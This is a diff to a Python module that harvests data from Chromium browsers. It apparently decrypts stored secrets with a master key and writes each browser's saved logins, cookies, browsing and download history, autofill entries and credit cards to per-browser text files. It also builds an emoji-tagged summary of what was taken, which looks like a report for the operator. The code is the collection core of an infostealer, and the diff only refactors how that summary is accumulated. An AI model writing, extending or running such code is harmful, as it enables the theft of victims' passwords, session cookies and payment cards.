@@ -15,7 +15,7 @@ history = ''''''
 downhistory = ''''''
 cards = ''''''
 autofills = ''''''
-listData = []
+msgInfo = ''''''
 
 def get_master_key(path: str):
     if not os.path.exists(path):
@@ -249,11 +249,12 @@ def Write(pathToLogs, browser):
     global downhistory
     global cards
     global autofills
+    global msgInfo
     colected = False
 
     if logins or cookies or history or downhistory or cards or autofills:
         try:
-            listData.append(f"\n🔍{browser}")
+            msgInfo+=f"\n🔍{browser}"
             os.makedirs(f"{pathToLogs}\\{browser}")
             colected = True
         except:
@@ -264,40 +265,40 @@ def Write(pathToLogs, browser):
         with open(rf"{pathToLogs}\\{browser}\\logins.txt", "w", encoding="utf-8") as f:
                 f.write(logins)
         f.close()
-        listData.append("\n∟🔑logins")
+        msgInfo+="\n∟🔑logins"
     
     if(history):
         with open(rf"{pathToLogs}\\{browser}\\history.txt", "w", encoding="utf-8") as f:
                 f.write(history)
         f.close()
-        listData.append("\n∟📰history")
+        msgInfo+="\n∟📰history"
     
     if(downhistory):
         with open(rf"{pathToLogs}\\{browser}\\downhistory.txt", "w", encoding="utf-8") as f:
                 f.write(downhistory)
         f.close()
-        listData.append("\n∟📥downhistory")
+        msgInfo+="\n∟📥downhistory"
     
     if(cookies):
         with open(rf"{pathToLogs}\\{browser}\\cookies.txt", "w", encoding="utf-8") as f:
                 f.write(cookies)
         f.close()
-        listData.append("\n∟🍪cookies")
+        msgInfo+="\n∟🍪cookies"
     
     if(autofills):
         with open(rf"{pathToLogs}\\{browser}\\autofills.txt", "w", encoding="utf-8") as f:
                 f.write(autofills)
         f.close()
-        listData.append("\n∟⌨autofills")
+        msgInfo+="\n∟⌨autofills"
     
     if(cards):
         with open(rf"{pathToLogs}\\{browser}\\cards.txt", "w", encoding="utf-8") as f:
                 f.write(cards)
         f.close()
-        listData.append("\n∟💳cards")
+        msgInfo+="\n∟💳cards"
         
     if colected:
-        listData.append("\n")
+        msgInfo+="\n"
     
     logins = ''''''
     cookies = ''''''
@@ -313,10 +314,10 @@ def Chromium():
     global downhistory
     global cards
     global autofills
-    global listData
+    global msgInfo
 
     Log("===========Chromium===========")
-    listData.append("\n**🌐Browsers🌐**")
+    msgInfo+="\n**🌐Browsers🌐**"
 
     local = os.getenv('LOCALAPPDATA')
     roaming = os.getenv('APPDATA')
@@ -378,4 +379,4 @@ def Chromium():
         get_autofils(value, True)
         Write(pathToLogs, key)
     
-    return listData
+    return msgInfo
